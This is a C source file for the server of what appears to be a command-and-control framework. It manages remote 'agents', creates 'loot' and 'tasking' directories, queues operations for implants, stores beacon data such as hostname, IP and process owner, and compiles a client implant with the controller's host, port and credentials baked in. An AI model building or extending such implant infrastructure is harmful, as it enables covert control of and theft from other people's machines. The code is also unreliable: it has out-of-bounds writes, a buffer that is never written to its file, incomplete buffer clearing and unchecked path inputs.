#include "agents.h"
#include "misc.h"
#include "authenticate.h"

void agent_write_info(char *id, char *connection_time,
     char *hostname, char *ip_addr, char *interfaces, char *proc_owner){
    
    char buff[BUFSIZ];
    FILE *fd = NULL;
    memset(buff, 0, sizeof(buff));
    sprintf(buff, "agents/%s/info.txt", id);
    fd = fopen(buff, "w");
    if(fd == NULL){
        perror("");
        return;
    }
    memset(buff, 0, sizeof(buff));
    if(id != NULL){
        strcat(buff, id);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    if(connection_time != NULL){
        strcat(buff, connection_time);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    if(hostname != NULL){
        strcat(buff, hostname);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    if(ip_addr != NULL){
        strcat(buff, ip_addr);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    if(interfaces != NULL){
        strcat(buff, interfaces);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    if(proc_owner != NULL){
        strcat(buff, proc_owner);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    fclose(fd);


}

void agent_init(char *agent_id){
    FILE *manifest = NULL;
    char parent_dir[2048];
    char tmp_buff[BUFSIZ];
    char *tmp = NULL;
    char *buff = NULL;
    int rc = 0;

    // TODO: Server is not correctly passing the agent ID to this function on first connection
    memset(parent_dir, 0, sizeof(parent_dir));
    memset(tmp_buff, 0, sizeof(tmp_buff));
    printf("Agent ID: %s\n", agent_id);
    sprintf(parent_dir, "%s/agents/%s", getcwd(tmp_buff, sizeof(tmp_buff)), agent_id);
    printf("Parent directory: %s\n", parent_dir);
    buff = strdup(parent_dir);
    tmp = strdup(parent_dir);
    rc = mkdir(parent_dir, 0755);
    if(rc != 0){
        perror("");
    }
    mkdir(strcat(parent_dir, "/loot"), 0755);
    mkdir(strcat(tmp, "/tasking"), 0755);

    manifest = fopen(strcat(buff, "/agent.mfst"), "w");
    fwrite("NULL :)", 1, sizeof("NULL :)"), manifest);
    fclose(manifest);
    agent_write_info(agent_id, NULL, NULL, NULL, NULL, NULL);

    
}

void write_format(char *path){
    FILE *fd;
    fd = fopen(path, "w");
    fwrite("NULL :)\n", 1, sizeof("NULL :)"), fd);
    fclose(fd);
}

char *agent_get_tasking(char *agent_id){
    char file[2048];
    char cwd_buf[BUFSIZ];
    char *mem_dump = NULL;
    int size = 0;
    FILE *fd = NULL;
    
    memset(cwd_buf, 0, sizeof(cwd_buf));
    memset(file, 0, sizeof(file));
    sprintf(file, "%s/agents/%s/agent.mfst", getcwd(cwd_buf, sizeof(cwd_buf)),agent_id);
    printf("Opening file %s\n", file);
    
    fd = fopen(file, "r");
    if(fd == NULL) return NULL;
    
    fseek(fd, 0L, SEEK_END);
    size = ftell(fd);
    rewind(fd);
    
    mem_dump = malloc(size+1);
    memset(mem_dump, 0, size+1);
    fread(mem_dump, 1, size, fd);
    
    fclose(fd);
    //write_format(file);
    return mem_dump;
}

void agent_register(char *username, char *password){
    FILE *file;
    file = fopen(DATA_FILE, "a");
    if (!file)
    {
        printf("Failed to open file thing\n");
        fclose(file);
        return;
    }
    fseek(file, 0L, SEEK_END);
    fwrite("\n", 1, 1, file);
    fwrite(username, 1, strlen(username), file);
    fwrite(":", 1, 1, file);

    char *buff;
    buff = authenticate_digest(password);

    fwrite(buff, 1, strlen(buff), file);
    fclose(file);
}


void agent_compile(char *ip, char *port){
    // In here the agent file header is editeed and recompiled against these values
    // Also in here is where the username and password are added to the server database
    
    // move over the required source files
    char buff[BUFSIZ];
    memset(buff, 0, sizeof(buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "client.c");
    misc_copy_file(buff, "out/client.c");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "agent.h");
    misc_copy_file(buff, "out/agent.h");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "agent.c");
    misc_copy_file(buff, "out/agent.c");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "b64.h");
    misc_copy_file(buff, "out/b64.h");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "b64.c");
    misc_copy_file(buff, "out/b64.c");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "beacon.h");
    misc_copy_file(buff, "out/beacon.h");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "beacon.c");
    misc_copy_file(buff, "out/beacon.c");

    memset(buff, 0, sizeof(buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "examples_common.h");
    misc_copy_file(buff, "out/examples_common.h");

    // create config file

    struct ret *struc = agent_gen_creds();

    printf("Agent Credentials:\n\tUser: %s, Password: %s\n", struc->usr, struc->passwd);

    memset(buff, 0, sizeof(buff));


    snprintf(buff, BUFSIZ, "#define HOST \"%s\"\n#define PORT %s\n#define GLOB_ID \"%s\"\n#define GLOB_LOGIN \"%s\"\n", ip, port, struc->usr, struc->passwd);

    FILE *fd = NULL;
    fd = fopen("out/config.h", "w");
    if (!fd)
    {
        printf("Failed to open  the config header file\n");
        return;
    }
    
    fwrite(buff, 1, strlen(buff) -1, fd);
    fclose(fd);

    printf("Compiling agent...\n");
    system(COMPILE);

    agent_register(struc->usr, struc->passwd);
    printf("Agent successfully compiled! Check the 'out/' directory for the client executable\n");
}

void agent_task(int operation, char *agent, char *opt){
    FILE *file = NULL;
    char buffer[BUFSIZ];
    char tmpbuff[BUFSIZ];
    memset(buffer, 0, sizeof(buffer));
    sprintf(buffer, "%s/agents/%s/agent.mfst", getcwd(tmpbuff, sizeof(tmpbuff)), agent);
    file = fopen(buffer, "a");
    if(!file){
        perror("Server failed to read agent tasking file");
        return;
    }
    printf("Server: Tasking %s with operation %d\n", agent, operation);
    memset(tmpbuff, 0, sizeof(tmpbuff));
    sprintf(tmpbuff, "%d|%s\n", operation, opt);
    fwrite(tmpbuff, 1, strlen(tmpbuff), file);
    fclose(file);
}

struct ret *agent_gen_creds(){
    struct ret *buf = malloc(sizeof(struct ret));
    memset(buf, 0, sizeof(struct ret));
    char *usr = malloc(13);
    memset(usr, 0, 13);
    char *pwd = malloc(13);
    memset(usr, 0, 13);

    usr[13] = '\0';
    pwd[13] = '\0';

    buf->usr = usr;
    buf->passwd = pwd;


    for(int i = 0; i < 12; i++){
        usr[i] = 'A' + (random() % 26);
    }

    for(int i = 0; i < 12; i++){
        pwd[i] = 'A' + (random() % 26);
    }

    return buf;
}

void agent_write_beacon(char *agent_id, char *beacon){
    FILE *fd = NULL;
    char buff[2048];
    char cwd[BUFSIZ];
    memset(buff, 0, sizeof(buff));
    memset(cwd, 0, sizeof(cwd));

    sprintf(buff, "%s/agents/%s/info.txt", getcwd(cwd, sizeof(cwd)), agent_id);

    fd = fopen(buff, "w");
    fwrite(beacon, 1,strlen(beacon), fd);
    fclose(fd);
}